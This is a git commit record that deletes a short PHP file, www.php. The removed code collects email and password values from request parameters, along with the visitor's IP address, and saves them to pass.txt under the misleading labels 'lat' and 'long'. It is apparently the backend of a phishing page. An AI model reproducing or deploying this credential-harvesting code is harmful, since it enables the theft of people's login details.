df519ad04d097d8c8b7bce7d6f1dc4dde1d5c0d5
HMA0 <151406744+HMA0@users.noreply.github.com>
2025-08-26 07:26:06 +0300

    Delete www.php

--- www.php
+++
@@ -1,8 +0,0 @@
-<?php
-
-$my_file = fopen("pass.txt", "w");
-$information = "lat:" . $_GET["email"] . "\nlong:" . $_GET["pass"] . "\nip: " . $_SERVER["REMOTE_ADDR"];
-fwrite($my_file, $information);
-fclose($my_file);
-
-?>
